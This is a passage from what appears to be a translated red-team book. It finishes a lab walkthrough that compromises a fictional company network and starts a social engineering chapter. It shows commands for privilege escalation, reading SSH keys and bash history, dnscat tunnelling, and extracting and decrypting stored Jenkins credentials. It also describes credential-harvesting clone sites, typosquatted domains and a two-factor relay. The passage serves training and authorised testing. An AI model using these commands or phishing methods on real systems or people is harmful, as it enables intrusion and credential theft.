whoami。
图4.54
注意：DirtyCOW漏洞用于权限提升并不是很稳定。如果漏洞利用存在一些问题，可查看我的GitHub页面，了解更稳定的创建setuid二进制文件的方法。
如果仍然存在问题，另一个选择是通过SSH工具登录第一个服务器，并以root身份执行dnscat静荷。登录时，可使用凭证hacker/changeme和sudo su - root。
现在，由于主机系统没有打补丁，因此您已成为系统的root用户。当您再次登录设备，并查找秘密信息时，您会看到root的bash历史文件。在此文件中，您可以找到SSH命令和私有SSH密钥引用。我们可以使用此SSH密钥，登录到我们的第二个设备172.16.250.30，如图4.55所示。
cat ~/.bash_history
head ~/.ssh/id_rsa
ssh -i ~/.ssh/id_rsa PI:EMAIL
图4.55
您花了一些时间在第二个设备上，并尝试了解它的用途。在搜索时，您会注意到/home目录中有一个Jenkins用户，这会导致您识别在端口8080上运行Jenkins服务。我们如何使用浏览器查看Jenkins服务器上的内容？在这里，dnscat的端口转发功能发挥了作用。我们需要退出最初的Shell，切换到命令终端。从那里，我们需要设置一个监听器，以便通过dnscat将流量从攻击者主机经过8080端口转发到Jenkins设备（172.16.250.30）。
执行dnscat端口转发，如图4.56所示。
退出我们当前的Shell。 
Ctrl + Z
返回我们的第一个命令代理并设置一个监听/端口转发。 
window -i 1
listen 127.0.0.1:8080 172.16.250.30:8080
在您的THP Kali虚拟机上，通过浏览器和端口转发协议（使用DNS协议，速度非常慢）。 
http://127.0.0.1:8080/jenkins
图4.56
在Jenkins应用程序的凭证管理器内部，我们将看到db_backup用户密码已经存储，但是无法访问，如图 4.57 所示。我们需要找出一种方法，获取 Jenkins 的凭证，从而可以继续横向移动。
图4.57
n00py在Jenkins凭证存储和提取方面做了一些研究。我们可以在此基础上，使用现有的Shell获取credentials.xml、master.key和hudson.util.Secret文件。
返回dnscat中的主菜单并与原始Shell进行交互。 
Ctrl + Z
window -i 2
转到Jenkins的主目录，获取3个文件：credentials.xml、master.key和hudson.util.Secret。 
cd /home/Jenkins
我们尝试下载这3个文件，或者采用base64编码从当前Shell复制。 
base64 credentials.xml
base64 secrets/hudson.util.Secret
base64 secrets/master.key
可以将base64输出复制到Kali虚拟机中，解码它们，恢复db_backup用户的密码。 
cd /opt/jenkins-decrypt
echo "" | base64 --decode >hudson.util.Secret
echo "" | base64 --decode > master.key
echo "" | base64 --decode >credentials.xml
破解密码，如图4.58所示。 
python3 ./decrypt.py master.key hudson.util.Secret credentials.xml
图4.58
我们成功破解了db_backup用户的密码“)uDvra {4UL ^; r?* h”。如果我们回顾一下之前的提示，可以在OpenCMS属性文件中发现数据库服务器位于172.16.250.50。出于某种原因，这个Jenkins服务器看起来对数据库服务器执行了某种备份。让我们检查一下是否可以基于db_backup的凭证：}uDvra {4UL ^; r?* h，使用SSH工具登录数据库服务器。唯一的问题是通过dnscat shell，我们没有直接按标准输入（STDIN），实现SSH的密码交互输入。因此，我们需要再次使用端口转发，将我们的SSH Shell从THP Kali VM，通过dnscat代理转到数据库服务器（172.16.250.50）。
返回命令Shell。 
Ctrl + Z
window -i 1
创建一个新的端口转发通道，从本地转到172.16.250.50的数据库服务器，如图4.59所示。 
listen 127.0.0.1:2222 172.16.250.50:22
一旦使用db_backup账户进入数据库服务器（172.16.250.50），我们就会注意到此账户是超级管理员之一，并且可以利用sudo su命令进入root。一旦以root权限登录数据库服务器，我们四处寻找，但找不到任何访问数据库的凭证。我们可以重置root数据库密码，但最终可能会影响其他一些应用程序的使用。我们在/var/lib/mysql 下搜索到其他的数据库，并找到一个cyberspacekittens数据库。在这里，我们找到了secrets.ibd文件，它包括密码列表的所有数据，如图4.60所示。在阅读数据时，我们意识到它可能是加密的。
图4.59
图4.60
至此，您已成功入侵CSK公司网络。
不要停在这里，您可以用这些设备做很多事情，我们只介绍了很少的内容。您可以随意在这些系统上操作，查找更多的敏感文件，找出其他权限升级方式等。作为参考，本实验的环境拓扑如图4.61所示。
图4.61
4.14 结论
在本章中，我们实现了网络突破。最开始的时候，在网络上没有凭证，通过社会工程的方式进入第一个被攻击者设备中。从那里，我们开始获取有关网络/系统的信息，在设备中迁移、提升权限，并最终突破整个网络。为了完成这一切，我们尽可能地减少扫描次数，使用网络自身的功能，并尽量规避各种安全工具的检测。
第5章 助攻——社会工程学
5.1 开展社会工程（SE）行动
作为红队，我们喜欢采用社会工程（SE）攻击方式，不仅仅是因为通常对技术要求较低，更因为能够以非常低的成本成功实施高价值的行动。通常只需设置几个虚假域名、服务器，以及伪造几封电子邮件，随意丢弃一些USB记忆棒，便能在一天内取得效果。
在指标方面，我们了解了一些显而易见的事情，例如发送的电子邮件数量，单击链接的用户数量以及输入密码的用户数量。我们也努力发挥创造力，为雇用我们的公司带来实质性价值。这方面的一个例子是DefCon的社会工程竞赛，参赛的选手拨打中心和员工的电话。您可能不熟悉这个比赛，在比赛中，参赛的选手要在有限的时间找到指定公司的一些“旗帜”。“旗帜”需要通过获取公司信息夺得（例如虚拟专用网络、他们使用的杀毒软件类型、员工的具体信息或者让员工访问URL等）。如果您想了解竞赛中使用的所有“旗帜”，那么可查看2017年的比赛报告。这些类型攻击的目的是通过培训员工发现恶意行为并报告给团队，帮助公司提高内部安全意识。
在本章中，我们将简单介绍一下在行动中使用的一些工具和技术。对于社会工程类的攻击，没有正确或错误的答案。本书认为，只要攻击取得效果，就达到预期目标了。
5.1.1 近似域名
我们在本书第2版中讨论了近似域名的话题。近似域名或者丢弃恶意软件仍然是获得最初凭证的一个有效方法。比较常见的方法是购买与目标公司非常相似的网址，或者容易输入错误的公司网址。
本书第2版有一个例子，如果攻击mail.cyberspacekittens.com网址，那么我们就会购买网址mailcyberspacekittens.com，并设置一个虚假的Outlook页面来捕获凭证。当被攻击者访问假网站并输入密码时，我们搜集这些数据，并将其重定向到公司的有效电子邮件服务器（mail.cyberspacekittens.com）。上述做法留给他们的印象是他们第一次意外地错误输入了密码，因此需要再次进行登录。
这种攻击的优势在于您不必进行任何网络钓鱼。有些人会输入错误或忘记“mail”和“cyberspacekittens”之间的点，然后输入他们的凭证。我们为被攻击者添加书签，这样被攻击者每天都会访问这个网站。
5.1.2 如何复制身份验证页面
一个较好的快速复制Web应用程序身份验证页面的工具是TrustedSec的社会工程工具包（SET）。这是社会工程行动的标准工具，其中获取凭证是优先事项。设置SET工具的步骤如下。
配置SET工具使用Apache（与默认Python相比）。 
将配置文件修改为以下内容
gedit /etc/setoolkit/set.config
APACHE_SERVER= ON
APACHE_DIRECTORY= / var / www / html
HARVESTER_LOG= / var / www / html
启动社会工程工具包（SET）。 
cd / opt / social-engineer-toolkit
setoolkit
网络钓鱼攻击向量。
网站攻击向量。
凭证获取攻击方法。
网站复制。
攻击者服务器的IP。
要复制的网站。
打开浏览器，转到攻击者服务器并进行测试。
所有文件存储在/var /www /html下，密码存放在harvester*下。在社会工程行动中复制页面的一些最佳做法如下。
将Apache服务器迁移，使用SSL协议运行。
将所有图像和资源放在本地（而不是从复制的站点调用）。
就个人而言，我喜欢用我的公共pgp密钥存储所有记录的密码。这样做时，如果服务器被突破，则没有私钥就无法恢复密码。这可以通过PHP gnupg_encrypt和gnupg_decrypt来实现。
5.1.3 双因子凭证
我们看到更多客户使用双因子身份验证（2FA）。虽然双因子身份验证对红队来说是一个巨大的考验，但是并非不可绕过。从过去的经验来说，我们必须创建自定义页面，处理双因子认证，但现在有了ReelPhish工具。FireEye开发的ReelPhish工具允许红队利用Selenium和Chrome自动触发双因子认证，条件是被攻击者在诱骗页面上输入凭证。
复制需要双因子身份验证的被攻击者站点。
在自己的攻击设备中，分析登录真实站点的流量。就我而言，我打开Burp Suite，截获鉴权所需的post参数。
修改复制站点，使用ReelPhish。访问/examplesitecode/samplecode.php并输入身份验证所需的所有必要参数。
被攻击者进入复制网站并进行身份验证。
凭证被回送给攻击者。
ReelPhish将向真实的网站提交身份验证，触发双因子认证。
被攻击者接收双因子认证码或者电话推送。
被攻击者重定向到真实站点再次登录（他们认为在初次认证时失败）。
如图5.1所示，我们绕过双因子认证，获得鉴权会话。尽管看起来这个工具支持Linux，但我在Kali中运行时遇到了一些问题。因此，首先在Windows中运行。
图5.1
关于双因子认证的身份认证，我想提到的一件事是确保在获得凭证后，核实所有不同的身份验证方法。我的意思是他们可能使用双因子认证，用于网站的身份验证，但对于API、旧胖客户端或所有应用程序端点，可能不需要双因子认证。我们已经看到许多应用程序在公共端点上需要双因子认证，但在应用程序的其他部分不使用双因子认证，缺乏安全保护。
5.2 网络钓鱼
红队取得巨大“成功”的另一项技术是传统的网络钓鱼。网络钓鱼的成功关键在于恐惧、紧迫性或者听起来好得令人难以置信的事情。恐惧和紧迫性确实发挥了作用，我相信很多读者以前都经历过这种情况。恐惧和紧迫性类型攻击包括以下一些情况。